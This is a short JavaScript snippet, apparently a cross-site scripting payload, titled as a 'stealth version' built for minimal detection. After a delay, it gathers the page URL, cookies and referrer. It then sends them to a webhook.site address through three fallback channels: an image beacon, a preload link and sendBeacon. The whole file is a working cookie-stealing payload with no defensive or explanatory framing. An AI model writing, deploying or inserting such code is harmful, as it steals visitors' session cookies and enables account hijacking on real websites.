// Stealth version - minimal detection
(function() {
    'use strict';
    
    // Delayed execution to avoid blocking
    setTimeout(function() {
        const payload = {
            u: window.location.href,
            c: document.cookie,
            r: document.referrer,
            t: new Date().getTime()
        };
        
        // Multiple exfiltration methods
        const methods = [
            () => {
                // Image beacon
                const img = new Image();
                img.src = `https://webhook.site/YOUR_WEBHOOK_ID?d=${btoa(JSON.stringify(payload))}`;
            },
            () => {
                // Link preload
                const link = document.createElement('link');
                link.rel = 'preload';
                link.href = `https://webhook.site/YOUR_WEBHOOK_ID?d=${btoa(JSON.stringify(payload))}`;
                link.as = 'fetch';
                document.head.appendChild(link);
            },
            () => {
                // Navigator.sendBeacon
                navigator.sendBeacon(
                    'https://webhook.site/YOUR_WEBHOOK_ID', 
                    new Blob([JSON.stringify(payload)], {type: 'application/json'})
                );
            }
        ];
        
        // Try each method until one works
        methods.some(method => {
            try {
                method();
                return true;
            } catch (e) {
                return false;
            }
        });
    }, 1500);
})();
